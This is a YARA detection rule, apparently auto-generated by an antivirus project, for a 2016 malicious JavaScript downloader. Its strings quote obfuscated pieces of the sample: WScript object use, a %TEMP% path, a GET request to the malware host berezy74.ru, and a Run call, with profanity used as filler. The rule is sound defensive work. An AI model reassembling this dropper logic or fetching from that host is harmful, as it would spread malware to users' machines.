rule sig_20160428_c36edb8a5bc102f6b92ed53dce8e4abb {
  meta:
    description = "datamaliciousorder - file 20160428_c36edb8a5bc102f6b92ed53dce8e4abb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "375604eb6755e45034e1bbaa086c37c3785c93a99b7d6bb90c29ff609d9e40f2"

  strings:
    $s1  = "function VuqQyqSvcIapDdzFarQao() {return UimIgjTcsMtuRusNjkGly[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "var UimIgjTcsMtuRusNjkGly = function DlhNoaGdlUtpQniEzfQei() {return QnkHigYerQulVpjYpsNon[TbzAogVxgVeuMwxGvtBaw](\"WScript\"+\"" ascii
    $s3  = "return QqzExiPhfLisPapNkzGws - SosYmzOhrJtuMnyYkaXrr;};" fullword ascii
    $s4  = "function PtwPsxMjhPbbKqkYahEsx(QqzExiPhfLisPapNkzGws, SosYmzOhrJtuMnyYkaXrr){IzkWjoMwhXydEyvPaxIey = IzkWjoMwhXydEyvPaxIey * 1; " ascii
    $s5  = "YhhAjqWyxFigHqsAkqZhw[ArmVylHfxRgvTtbDdbEwu](\"G\" + \"ET\", \"http://berezy74.ru/n8sjad\", false);" fullword ascii
    $s6  = "var UimIgjTcsMtuRusNjkGly = function DlhNoaGdlUtpQniEzfQei() {return QnkHigYerQulVpjYpsNon[TbzAogVxgVeuMwxGvtBaw](\"WScript\"+\"" ascii
    $s7  = "var QnkHigYerQulVpjYpsNon = this[\"WScript\"];" fullword ascii
    $s8  = "function GvdDxcAlmVhzCdcAamXhw(LsfCvtMlcBgbJuzUfeEpy){UimIgjTcsMtuRusNjkGly[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s9  = "function VuqQyqSvcIapDdzFarQao() {return UimIgjTcsMtuRusNjkGly[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function GvdDxcAlmVhzCdcAamXhw(LsfCvtMlcBgbJuzUfeEpy){UimIgjTcsMtuRusNjkGly[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s11 = "function PtwPsxMjhPbbKqkYahEsx(QqzExiPhfLisPapNkzGws, SosYmzOhrJtuMnyYkaXrr){IzkWjoMwhXydEyvPaxIey = IzkWjoMwhXydEyvPaxIey * 1; " ascii
    $s12 = "if (YhhAjqWyxFigHqsAkqZhw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function RzbRjqDffHekBjtDckCde(){return NbcVrzOyqUjoBixWwdDlo + \"\";};" fullword ascii
    $s14 = "function SquTsyXauZxgPcsAggGed() {return ((SreIswRzyYgxPfvKmfSmh == true) && (SreIswRzyYgxPfvKmfSmh == XobSrbJtrRqaZspUiaIfk)) ?" ascii
    $s15 = "function SquTsyXauZxgPcsAggGed() {return ((SreIswRzyYgxPfvKmfSmh == true) && (SreIswRzyYgxPfvKmfSmh == XobSrbJtrRqaZspUiaIfk)) ?" ascii
    $s16 = "}while (GlbCruIklJosPgiGopYkc);" fullword ascii
    $s17 = "function QorDavZtyHeiXwlRyrYgq()" fullword ascii
    $s18 = "var RxwDtmDceRvnDitQpnXfo = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function LkiTyvMoyAmjFleBfzQdc(VelCwzSduAunLanUhgAoy) {var BirDsaOfhWddDhaOqrAht = (1, 2, 3, 4, 5, VelCwzSduAunLanUhgAoy); retur" ascii
    $s20 = "XmaWicWcoAasFbtMblPxm = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}